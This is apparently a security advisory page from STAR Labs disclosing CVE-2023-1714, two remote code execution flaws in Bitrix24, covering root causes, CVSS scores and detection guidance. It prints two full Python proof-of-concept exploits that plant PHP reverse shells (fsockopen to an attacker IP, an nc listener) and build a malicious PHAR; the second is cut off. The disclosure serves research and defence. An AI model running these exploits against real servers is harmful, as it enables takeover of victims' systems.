<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1714   CVE Description Unsafe variable extraction in bitrix/modules/main/classes/general/user_options.php in Bitrix24 22.0.300 allows remote authenticated attackers to execute arbitrary code via (1) appending arbitrary content to existing PHP files or (2) PHAR deserialization.">
<meta name="author" content="Lam Jun Rong &amp; Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-1714/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction" />
<meta property="og:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1714   CVE Description Unsafe variable extraction in bitrix/modules/main/classes/general/user_options.php in Bitrix24 22.0.300 allows remote authenticated attackers to execute arbitrary code via (1) appending arbitrary content to existing PHP files or (2) PHAR deserialization." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-1714/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-11-01T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-11-01T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction"/>
<meta name="twitter:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1714   CVE Description Unsafe variable extraction in bitrix/modules/main/classes/general/user_options.php in Bitrix24 22.0.300 allows remote authenticated attackers to execute arbitrary code via (1) appending arbitrary content to existing PHP files or (2) PHAR deserialization."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction",
      "item": "https://starlabs.sg/advisories/23/23-1714/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction",
  "name": "(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction",
  "description": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1714   CVE Description Unsafe variable extraction in bitrix/modules/main/classes/general/user_options.php in Bitrix24 22.0.300 allows remote authenticated attackers to execute arbitrary code via (1) appending arbitrary content to existing PHP files or (2) PHAR deserialization.",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1714   CVE Description Unsafe variable extraction in bitrix/modules/main/classes/general/user_options.php in Bitrix24 22.0.300 allows remote authenticated attackers to execute arbitrary code via (1) appending arbitrary content to existing PHP files or (2) PHAR deserialization.   CWE Classification(s) CWE-73 External Control of File Name or Path; CWE-502 Deserialization of Untrusted Data   CAPEC Classification(s) CAPEC-549 Local Execution of Code    1. RCE via appending arbitrary content to existing PHP files CVSS3.1 Scoring System: Base Score: 8.8 (High) Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) Low   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Vulnerability Details: This report presents information on an insecure file append vulnerability in Bitrix24 which allows an adversary to run arbitrary commands on the affected web server.\nIt was discovered that the init function of the Export controller located at bitrix/modules/main/lib/controller/export.php allows an attacker to control several properties within the Export class, including the filePath property. This stems from the incorrect assumption that the value returned from CUserOptions::GetOption cannot be controlled by an attacker.\nThe filePath property is used by the exportAction function to determine the file where attacker controlled exported data should be written to. Thus, by controlling this property, an attacker can append nearly arbitrary data to any file, including PHP files, and thus achieveing remote code execution.\nThe Export controller is subclassed by several other controllers, each responsible for exporting entities related to its own module. For this report, we will focus on the crm export controller located at bitrix/modules/crm/lib/controller/export.php, though the vulnerability is present in any class that extends Bitrix\\Main\\Controller\\Export.\nThe Bitrix\\Main\\Controller\\Export::init function is called when a POST request is made to https://TARGET_HOST/bitrix/services/main/ajax.php?action=bitrix%3Acrm.api.export.export.\n// bitrix/modules/main/lib/controller/export.php lines 205 to 220  $progressData = $this-getProgressParameters(); // [1] if (count($progressData)  0) { $this-isNewProcess = (empty($progressData['processToken']) || $progressData['processToken'] !== $this-processToken); if (!$this-isNewProcess) { // restore state  foreach ($this-fieldToStoreInProcess as $fieldName) // [2]  { if (isset($progressData[$fieldName])) { $this-{$fieldName} = $progressData[$fieldName]; // [3]  } } } } In [1] the getProgressParameters() function is called to retrieve any progress that has been made since the previous request. This function calls and returns the result of the CUserOptions::GetOption. In the next section, we will examine the getProgressParameters() function in greater detail and show that the return value of this function can be almost completely controlled by an attacker.\nNext, if the processToken of the saved progress data matches that sent in the request, control flow enters the loop at [2]. As the $progressData variable is controlled by the attacker, this condition is trivial to satisfy.\nFor each property whitelisted in the $this-fieldToStoreInProcess array, if the property also exists in the attacker controlled $progressData variable, the value of the property in the Bitrix\\Main\\Controller\\Export class will be overwritten by the value in $progressData. As filePath is one of the whitelisted properties, an attacker can thus control the filePath property on the Bitrix\\Main\\Controller\\Export class.\nAfter saved properties are reinitialized, the action handler function, exportAction is called:\npublic function exportAction(){ // initalize properties if not already set by init()  // line 454  ob_start(); $componentResult = $APPLICATION-IncludeComponent( // [4]  $this-componentName, '', $componentParameters ); $exportData = ob_get_contents(); ob_end_clean(); $processedItemsOnStep = 0; if (is_array($componentResult)) { // set $processedItemsOnStep to the number of items exported  } if ($this-totalItems == 0) { break; } if ($processedItemsOnStep  0) { $this-processedItems += $processedItemsOnStep; $this-writeTempFile($exportData, ($nextPage === 1)); // [5]  unset($exportData); $this-isExportCompleted = ($this-processedItems = $this-totalItems); if ($this-isExportCompleted \u0026\u0026 !$this-isCloudAvailable) { // adjust completed file size  $this-fileSize = $this-getSizeTempFile(); } } } The exportAction function includes a component based on the COMPONENT_NAME request body parameter. For example, to export crm contacts, the crm.contact.list component is included at [4]. The output of this component is a list of contacts in CSV format stored in the $exportData variable. An attacker can control parts of the exported data by creating contacts with malicious payloads hidden in the SOURCE_DESCRIPTION field.\nNext, the writeTempFile function is called to write $exportData to a file:\n// bitrix/modules/main/lib/controller/export.php lines 1296 to 1315  protected function writeTempFile($data, $precedeUtf8Bom = true) { $file = fopen($this-filePath, 'ab'); // [6]  if(is_resource($file)) { // add UTF-8 BOM marker  if (\\Bitrix\\Main\\Application::isUtfMode() || defined('BX_UTF')) { if($precedeUtf8Bom === true \u0026\u0026 (filesize($this-filePath) === 0)) { fwrite($file, chr(239).chr(187).chr(191)); } } fwrite($file, $data); // [7]  fclose($file); unset($file); $this-fileSize = filesize($this-filePath); } } The file specified by the attacker controlled filePath property is opened in append mode at [6] and the exported data is appended to it at [7].\nTherefore, an attacker can append arbitrary PHP code to a PHP file, resulting in remote command execution.\nAttacker-controlled User Options In this section we will show how an authenticated attacker can alter their own user options, thus controlling the return value of any CUserOptions::GetOption call and eventually the filePath property of the Bitrix\\Main\\Controller\\Export class.\nFirst, we observe that the getProgressParameters() is just a simple wrapper over a CUserOptions::GetOption call at [8]. In the case of exporting CRM contacts, this-module is 'crm' and $this-getProgressParameterOptionName() is 'crm_cloud_export_CONTACT'.\n// bitrix/modules/main/lib/controller/export.php lines 1165 to 1174  protected function getProgressParameters() { $progressData = \\CUserOptions::GetOption($this-module, $this-getProgressParameterOptionName()); // [8]  if (!is_array($progressData)) { $progressData = array(); } return $progressData; } Although this class assumes that the return value of CUserOptions::GetOption cannot be arbitrarily controlled by an attacker, there are several ways to do so. In this section, we will examine one of them.\nThe CUserOptions::SetOptionsFromArray function found in bitrix/modules/main/classes/general/user_options.php lines 216 to 243 can be used to set any user option.\nThis function is called by CUserOptions::SetCookieOptions, shown below:\n// bitrix/modules/main/classes/general/user_options.php lines 317 to 329  public static function SetCookieOptions($cookieName) { //last user setting  $varCookie = array(); parse_str($_COOKIE[$cookieName], $varCookie); // [9]  setcookie($cookieName, false, false, \"/\"); if (is_array($varCookie[\"p\"]) \u0026\u0026 $varCookie[\"sessid\"] == bitrix_sessid()) { $arOptions = $varCookie[\"p\"]; CUtil::decodeURIComponent($arOptions); CUserOptions::SetOptionsFromArray($arOptions); // [10]  } } This function retrieves the user options from a user supplied cookie at [9], parses it as a query string, then calls CUserOptions::SetOptionsFromArray on the result at [10].\nThe CUserOptions::SetCookieOptions function is in turn called by the CAllMain::PrologActions function, if the $cookieName cookie is set. The default cookie name is BITRIX_SM_LAST_SETTINGS.\npublic static function PrologActions(){ // ...  // bitrix/modules/main/classes/general/main.php lines 3497 to 3501  $cookieName = COption::GetOptionString(\"main\", \"cookie_name\", \"BITRIX_SM\").\"_LAST_SETTINGS\"; if(!empty($_COOKIE[$cookieName])) { CUserOptions::SetCookieOptions($cookieName); } // ... } The CAllMain::PrologActions function is called in bitrix/modules/main/include/prolog_before.php which is included in nearly every Bitrix24 route. Therefore, by setting the BITRIX_SM_LAST_SETTINGS cookie, an attacker can easily manipulate their own user options.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the insecure file append vulnerability and opens a reverse shell connection to the victim web server. The reverse shell code, defined in the CODE_TO_INJECT variable, is appended to the file specified in TARGET_FILE.\nA sample exploit script is shown below:\n# Bitrix24 Insecure File Append RCE (CVE-2023-XXXXX) # Via: https://TARGET_HOST/bitrix/services/main/ajax.php?action=bitrix%3Acrm.api.export.export # Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.) #!/usr/bin/env python3 import base64 import requests import re import os import typing import subprocess import threading HOST = \"http://localhost:8000\" SITE_ID = \"s1\" USERNAME = \"user\" PASSWORD = \"abcdef\" # ROOT_PATH is not necessary, it is possible to use relative paths to exploit ROOT_PATH = \"/var/www/html/\" TARGET_FILE = \"include/company_name.php\" LPORT = 9001 LHOST = \"192.168.86.43\" PROXY = {\"http\": \"http://localhost:8080\"} CODE_TO_INJECT = f\"\"\" // Restore file for future demos $file_data = file_get_contents(\"{ROOT_PATH}{TARGET_FILE}\"); $original = mb_substr($file_data, 0, mb_strpos($file_data, '\"ID\";\"Photo\"')); file_put_contents(\"{ROOT_PATH}{TARGET_FILE}\", $original); /* Sleep to allow nc listener to start */ sleep(2); $sock=fsockopen($_GET[\"ip\"], intval($_GET[\"port\"])); $proc=proc_open(\"/bin/sh -i\", array(0=$sock, 1=$sock, 2=$sock),$pipes); \"\"\" def nested_to_urlencoded(val: typing.Any, prefix=\"\") - dict: out = dict() if type(val) is dict: for k, v in val.items(): child = nested_to_urlencoded(v, prefix=(k if prefix == \"\" else f\"[{k}]\")) for key, val in child.items(): out[prefix + key] = val elif type(val) in [list, tuple]: for i, item in enumerate(val): child = nested_to_urlencoded(item, prefix=f\"[{i}]\") for key, val in child.items(): out[prefix + key] = val else: out[prefix] = val return out def dict_to_str(d): return \"\u0026\".join(f\"{k}={v}\" for k, v in d.items()) def check_creds(cookie, sessid): return requests.get(HOST + \"/bitrix/tools/public_session.php\", headers={ \"X-Bitrix-Csrf-Token\": sessid }, cookies={ \"PHPSESSID\": cookie, }, proxies=PROXY).text == \"OK\" def login(session, username, password): if os.path.isfile(\"./cached-creds.txt\"): cookie, sessid = open(\"./cached-creds.txt\").read().split(\":\") if check_creds(cookie, sessid): session.cookies.set(\"PHPSESSID\", cookie) print(\"[+] Using cached credentials\") return sessid else: print(\"[!] Cached credentials are invalid\") session.get(HOST + \"/\") resp = session.post( HOST + \"/?login=yes\", data={ \"AUTH_FORM\": \"Y\", \"TYPE\": \"AUTH\", \"backurl\": \"/\", \"USER_LOGIN\": username, \"USER_PASSWORD\": password, }, ) if session.cookies.get(\"BITRIX_SM_LOGIN\", \"\") == \"\": print(f\"[!] Invalid credentials\") exit() sessid = re.search(re.compile(\"'bitrix_sessid':'([a-f0-9]{32})'\"), resp.text).group( 1 ) print(f\"[+] Logged in as {username}\") with open(\"./cached-creds.txt\", \"w\") as f: f.write(f\"{session.cookies.get('PHPSESSID')}:{sessid}\") return sessid def set_progress_data(session, sessid): print(f\"[+] Setting fake user options\") session.cookies.set(\"BITRIX_SM_LAST_SETTINGS\", dict_to_str(nested_to_urlencoded( { \"p\": [{ \"c\": \"crm\", \"v\": { \"filePath\": f\"{ROOT_PATH}{TARGET_FILE}\", \"processToken\": \"b\", }, \"n\": \"crm_cloud_export_CONTACT\" }], \"sessid\": sessid } ))) session.get( HOST + \"/bitrix/tools/public_session.php\", headers={\"X-Bitrix-Csrf-Token\": sessid}, ) def trigger_file_append(session, sessid): print(f\"[+] Appending payload to target file\") session.post( HOST + \"/bitrix/services/main/ajax.php?action=bitrix%3Acrm.api.export.export\", headers={ \"Content-Type\": \"application/x-www-form-urlencoded\", \"X-Bitrix-Csrf-Token\": sessid }, data={ \"ENTITY_TYPE\": \"CONTACT\", \"EXPORT_TYPE\": \"csv\", \"COMPONENT_NAME\": \"bitrix:crm.contact.list\", \"PROCESS_TOKEN\": \"b\", \"REQUISITE_MULTILINE\": \"Y\", \"EXPORT_ALL_FIELDS\": \"Y\", \"INITIAL_OPTIONS[REQUISITE_MULTILINE]\": \"Y\", \"INITIAL_OPTIONS[EXPORT_ALL_FIELDS]\": \"Y\" } ) def delete_contact(session: requests.Session, sessid, contactId): print(f\"[+] Deleting contact {contactId}\") res = session.post( HOST + \"/bitrix/services/main/ajax.php?action=crm.api.entity.prepareDeletion\", headers={ \"Content-Type\": \"application/x-www-form-urlencoded\", \"X-Bitrix-Csrf-Token\": sessid }, data=f\"params[gridId]=CRM_CONTACT_LIST_V12\u0026params[entityTypeId]=3\u0026params[extras][CATEGORY_ID]=0\u0026params[entityIds][0]={contactId}\", ) hash = res.json()[\"data\"][\"hash\"] session.post( HOST + \"/bitrix/services/main/ajax.php?action=crm.api.entity.processDeletion\", headers={ \"Content-Type\": \"application/x-www-form-urlencoded\", \"X-Bitrix-Csrf-Token\": sessid }, data=f\"params[hash]={hash}\", ) print(f\"[+] Contact {contactId}deleted\") def create_contact(session: requests.Session, sessid): payload = f\"{base64.b64encode(CODE_TO_INJECT.encode()).decode()}')) ?\" res = session.post( HOST + \"/bitrix/components/bitrix/crm.contact.details/ajax.php?sessid=\" + sessid, headers={ \"Content-Type\": \"application/x-www-form-urlencoded\", }, data={ \"PARAMS[NAME_TEMPLATE]\": \"#NAME# #LAST_NAME#\", \"PARAMS[CATEGORY_ID]\": \"0\", \"EDITOR_CONFIG_ID\": \"contact_details\", \"HONORIFIC\": \"\", \"LAST_NAME\": \"\", \"NAME\": \"Definitely not Attacker\", \"SECOND_NAME\": \"\", \"BIRTHDATE\": \"\", \"POST\": \"\", \"PHONE[n0][VALUE]\": \"\", \"PHONE[n0][VALUE_TYPE]\": \"WORK\", \"EMAIL[n0][VALUE]\": \"\", \"EMAIL[n0][VALUE_TYPE]\": \"WORK\", \"WEB[n0][VALUE]\": \"\", \"WEB[n0][VALUE_TYPE]\": \"WORK\", \"IM[n0][VALUE]\": \"\", \"IM[n0][VALUE_TYPE]\": \"FACEBOOK\", \"CLIENT_DATA\": \"{\\\"COMPANY_DATA\\\":[]}\", \"TYPE_ID\": \"CLIENT\", \"SOURCE_ID\": \"CALL\", \"SOURCE_DESCRIPTION\": payload, \"OPENED\": \"Y\", \"EXPORT\": \"Y\", \"ASSIGNED_BY_ID\": \"3\", \"COMMENTS\": \"\", \"contact_0_details_editor_comments_html_editor\": \"\", \"ACTION\": \"SAVE\", \"ACTION_ENTITY_ID\": \"\", \"ACTION_ENTITY_TYPE\": \"C\", \"ENABLE_REQUIRED_USER_FIELD_CHECK\": \"Y\" } ) contactId = re.compile(\"'ENTITY_ID':'([0-9]+)'\").findall(res.text)[0] print(f\"[+] Created contact {contactId}\") return int(contactId) def reverse_shell(): requests.get(f\"{HOST}/{TARGET_FILE}?ip={LHOST}\u0026port={LPORT}\") if __name__ == \"__main__\": s = requests.Session() s.proxies = PROXY sessid = login(s, USERNAME, PASSWORD) contactId = create_contact(s, sessid) try: set_progress_data(s, sessid) trigger_file_append(s, sessid) finally: delete_contact(s, sessid, contactId) threading.Thread(target=reverse_shell).start() print(\"[+] Waiting for reverse shell connection\") subprocess.run([\"nc\", \"-nvlp\", str(LPORT)]) Exploit Conditions: This vulnerability can be exploited when the attacker has access to the CRM feature and permission to create and export contacts. This level of access may be granted if the user is in the management board group.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by checking if any PHP files have been recently modified. Alternatively, the traffic logs can be examined to check if any of the BITRIX_SM_LAST_SETTINGS cookies sent to the server contain the string filePath.\n2. RCE via PHAR deserialization CVSS3.1 Scoring System: Base Score: 8.8 (High) Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) Low   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Vulnerability Details: This report presents information on a PHAR deserialization vulnerability in Bitrix24 which allows an adversary to run arbitrary commands on the affected web server.\nIt was discovered that the code in bitrix/components/bitrix/crm.contact.list/stexport.ajax.php allows an attacker to call the file_exists function on arbitrary input. This stems from the incorrect assumption that the value returned from CUserOptions::GetOption cannot be controlled by an attacker. When Bitrix is run with PHP version phar:// protocol to load a malicious .phar file, which would lead to Remote Code Execution via PHP Object Injection.\n// bitrix/components/bitrix/crm.contact.list/stexport.ajax.php line 127  $progressData = CUserOptions::GetOption('crm', 'crm_stexport_contact', ''); // [1] if (!is_array($progressData)) $progressData = array(); $lastToken = isset($progressData['PROCESS_TOKEN']) ? $progressData['PROCESS_TOKEN'] : ''; $isNewToken = ($processToken !== $lastToken); // [2] // ... if ($isNewToken) { $filePath = ''; // ... } else { $filePath = isset($progressData['FILE_PATH']) ? $progressData['FILE_PATH'] : 0; // [3]  // ... } In [1], the existing progress data for current export process is loaded from user options via CUserOptions::GetOption. We will show in the next section that this value can completely controlled by an attacker.\nIf the process token in the saved progress data matches that sent in the request, the $isNewToken is set to false and control flow enters the else block. The $filePath variable is initialized from the attacker controlled $progressData object ([3]), along with other variables.\nAfter saved variables are loaded, some checks are performed on the $filePath variable:\n// bitrix/components/bitrix/crm.contact.list/stexport.ajax.php line 160  if (!is_string($filePath) || $filePath == '' || !CheckDirPath($filePath)){ // ... } The CheckDirPath function calls file_exists on the path, after removing the file name:\n// bitrix/modules/main/tools.php lines 2347 to 2370  function CheckDirPath($path) { //remove file name \tif(mb_substr($path, -1) != \"/\") { $p = mb_strrpos($path, \"/\"); $path = mb_substr($path, 0, $p); } $path = rtrim($path, \"/\"); if($path == \"\") { //current folder always exists \treturn true; } if(!file_exists($path)) { return mkdir($path, BX_DIR_PERMISSIONS, true); } return is_dir($path); } Therefore, an attacker could call the file_exists function with an arbitrary scheme, such as phar://, which could lead to the deserialization of PHP objects that are contained within the phar’s metadata. We discuss one example of such an object chain that would lead to RCE.\nThe PropertiesDialog class, found at bitrix/modules/bizproc/lib/activity/propertiesdialog.php, contains the following __toString function:\n// lines 402 to 423  public function __toString() { if ($this-renderer !== null) { return call_user_func($this-renderer, $this); } $runtime = \\CBPRuntime::getRuntime(); $runtime-startRuntime(); return (string)$runtime-executeResourceFile( $this-activityFile, $this-dialogFileName, array_merge(array( 'dialog' = $this, //compatible parameters  'arCurrentValues' = $this-getCurrentValues($this-dialogFileName === 'properties_dialog.php'), 'formName' = $this-getFormName() ), $this-getRuntimeData() ) ); } // lines 471 to 474 public function getRuntimeData() { return $this-runtimeData; } The $runtime-executeResourceFile function is called. Note that all parameters to this function are attacker controllable as they are either properties of the PropertiesDialog class ($this-activityFile and $this-dialogFileName) or are derived from them ($this-runtimeData via $this-getRuntimeData()). As an attacker has a PHP object deserialization primitive, they can controll these properties.\nThe ExecuteResourceFile function performs two checks ([4] and [5]) before calling include on $path[0] ([6]):\n// bitrix/modules/bizproc/classes/general/runtime.php lines 571 to 588  public function ExecuteResourceFile($activityPath, $filePath, $arParameters = array()) { $result = null; $path = $this-GetResourceFilePath($activityPath, $filePath); // [4]  if ($path != null) { ob_start(); foreach ($arParameters as $key = $value) ${$key} = $value; // [7]  $this-LoadActivityLocalization($path[1], $filePath); // [5]  include($path[0]); // [6]  $result = ob_get_contents(); ob_end_clean(); } return $result; } It was determined that setting $activityPath to null and $filePath to stexport.php would allow both checks to pass. However, the value of $path[0] would be stexport.php and not an attacker controlled location.\nHowever, the code at [7], which sets each property of the attacker controlled $arParameters variable as a local variable, allows an attacker to override the $path variable after the completion of the first check but before the second check. This allows an attacker to modify $path[0] to an attacker controlled path.\nAs the second check only involves $path[1] and $filePath, modification of $path[0] will not result in the check failing.\nTherefore, an attacker can use the PropertiesDialog class to include arbitrary files.\nThere are several classes that would trigger the __toString method of PropertiesDialog when they are destructed. One such class is CCloudsDebug, found in bitrix/modules/clouds/include.php:\n// line 39 class CCloudsDebug { protected static $instances = array(); public static function getInstance($action = \"counters\") { // ...  } protected $head = ''; protected $id = ''; public function __construct($action) { // ...  } public function __destruct() { $cloudsKey = $this-head.\"|\".$this-id.\"|mess\"; // [8]  $prevTrace = apcu_fetch($cloudsKey); if ($prevTrace) AddMessage2Log($prevTrace, \"clouds\", 0); apcu_delete($cloudsKey); apcu_delete($this-head.\"|\".$this-id); } // ... } At [8], the head property is concatenated with a string. This causes the __toString method of $this-head to be called. Thus, an attacker could trigger the arbitrary file include detailed above by setting $this-head to a specially constructed PropertiesDialog object.\nFinally, an attacker requires a method to upload the malicious PHAR file to the server. This method would also have to disclose the path of the PHAR file on the server.\nIt was discovered that an authenticated attacker could upload images via changing the profile picture of a CRM contact. The endpoint used for this process (/bitrix/components/bitrix/main.file.input/ajax.php) discloses the path of the uploaded image. A PHAR/JPG polyglot (based on code by kunte0 found here) was used to pass checks on the validity of the uploaded image.\nAttacker-controlled User Options The root cause of this vulnerability is the incorrect assumption that the return value of CUserOptions::GetOption cannot be arbitrarily controlled by an attacker. However, there are several ways to do so. In this section, we will examine one of them.\nThe CUserOptions::SetOptionsFromArray function found in bitrix/modules/main/classes/general/user_options.php lines 216 to 243 can be used to set any user option.\nThis function is called by CUserOptions::SetCookieOptions, shown below:\n// bitrix/modules/main/classes/general/user_options.php lines 317 to 329  public static function SetCookieOptions($cookieName) { //last user setting  $varCookie = array(); parse_str($_COOKIE[$cookieName], $varCookie); // [9]  setcookie($cookieName, false, false, \"/\"); if (is_array($varCookie[\"p\"]) \u0026\u0026 $varCookie[\"sessid\"] == bitrix_sessid()) { $arOptions = $varCookie[\"p\"]; CUtil::decodeURIComponent($arOptions); CUserOptions::SetOptionsFromArray($arOptions); // [10]  } } This function retrieves the user options from a user supplied cookie at [9], parses it as a query string, then calls CUserOptions::SetOptionsFromArray on the result at [10].\nThe CUserOptions::SetCookieOptions function is in turn called by the CAllMain::PrologActions function, if the $cookieName cookie is set. The default cookie name is BITRIX_SM_LAST_SETTINGS.\npublic static function PrologActions(){ // ...  // bitrix/modules/main/classes/general/main.php lines 3497 to 3501  $cookieName = COption::GetOptionString(\"main\", \"cookie_name\", \"BITRIX_SM\").\"_LAST_SETTINGS\"; if(!empty($_COOKIE[$cookieName])) { CUserOptions::SetCookieOptions($cookieName); } // ... } The CAllMain::PrologActions function is called in bitrix/modules/main/include/prolog_before.php which is included in nearly every Bitrix24 route. Therefore, by setting the BITRIX_SM_LAST_SETTINGS cookie, an attacker can easily manipulate their own user options.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the PHAR deserialization vulnerability and opens a reverse shell connection to the victim web server.\nA sample exploit script is shown below:\n# Bitrix24 PHAR Deserialization RCE (CVE-2023-XXXXX) # Via: https://TARGET_HOST/bitrix/components/bitrix/crm.contact.list/stexport.ajax.php # Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.) #!/usr/bin/env python3 import random import json import requests import re import os import typing import subprocess import threading HOST = \"http://localhost:8000\" SITE_ID = \"s1\" USERNAME = \"crm_only\" PASSWORD = \"crm_only\" ROOT_PATH = \"/var/www/html/\" PORT = 9001 LHOST = \"192.168.86.125\" PROXY = {\"http\": \"http://localhost:8080\"} def nested_to_urlencoded(val: typing.Any, prefix=\"\") - dict: out = dict() if type(val) is dict: for k, v in val.items(): child = nested_to_urlencoded(v, prefix=(k if prefix == \"\" else f\"[{k}]\")) for key, val in child.items(): out[prefix + key] = val elif type(val) in [list, tuple]: for i, item in enumerate(val): child = nested_to_urlencoded(item, prefix=f\"[{i}]\") for key, val in child.items(): out[prefix + key] = val else: out[prefix] = val return out def dict_to_str(d): return \"\u0026\".join(f\"{k}={v}\" for k, v in d.items()) def check_creds(cookie, sessid): return requests.get(HOST + \"/bitrix/tools/public_session.php\", headers={ \"X-Bitrix-Csrf-Token\": sessid }, cookies={ \"PHPSESSID\": cookie, }, proxies=PROXY).text == \"OK\" def login(session, username, password): if os.path.isfile(\"./cached-creds.txt\"): cookie, sessid = open(\"./cached-creds.txt\").read().split(\":\") if check_creds(cookie, sessid): session.cookies.set(\"PHPSESSID\", cookie) print(\"[+] Using cached credentials\") return sessid else: print(\"[!] Cached credentials are invalid\") session.get(HOST + \"/\") resp = session.post( HOST + \"/?login=yes\", data={ \"AUTH_FORM\": \"Y\", \"TYPE\": \"AUTH\", \"backurl\": \"/\", \"USER_LOGIN\": username, \"USER_PASSWORD\": password, }, ) if session.cookies.get(\"BITRIX_SM_LOGIN\", \"\") == \"\": print(f\"[!] Invalid credentials\") exit() sessid = re.search(re.compile(\"'bitrix_sessid':'([a-f0-9]{32})'\"), resp.text).group( 1 ) print(f\"[+] Logged in as {username}\") with open(\"./cached-creds.txt\", \"w\") as f: f.write(f\"{session.cookies.get('PHPSESSID')}:{sessid}\") return sessid def upload_web_shell(s, sessid): data = f\"\"\" sleep(2); $sock=fsockopen(\"{LHOST}\", {PORT}); $proc=proc_open(\"/bin/sh -i\", array(0=$sock, 1=$sock, 2=$sock),$pipes);\"\"\" return upload(s, sessid, data) def upload(session, sessid, data): CID = random.randint(0, pow(10, 5)) resp = session.post( HOST + \"/desktop_app/file.ajax.php?action=uploadfile\", headers={ \"X-Bitrix-Csrf-Token\": sessid, \"X-Bitrix-Site-Id\": SITE_ID, }, data={ \"bxu_info[mode]\": \"upload\", \"bxu_info[CID]\": str(CID), \"bxu_info[filesCount]\": \"1\", \"bxu_info[packageIndex]\": f\"pIndex{CID}\", \"bxu_info[NAME]\": f\"file{CID}\", \"bxu_files[0][name]\": f\"file{CID}\", }, files={ \"bxu_files[0][default]\": ( \"file\", data, \"text/plain\", ) }, proxies=PROXY, ).json() return resp[\"files\"][0][\"file\"][\"files\"][\"default\"][\"tmp_name\"] def make_phar(path): os.system(\"rm ./test.phar\") print(f\"[+] Creating PHAR\") os.system(f\"php --define phar.readonly=0 create_phar.php {path}\") return open(\"./test.phar\", 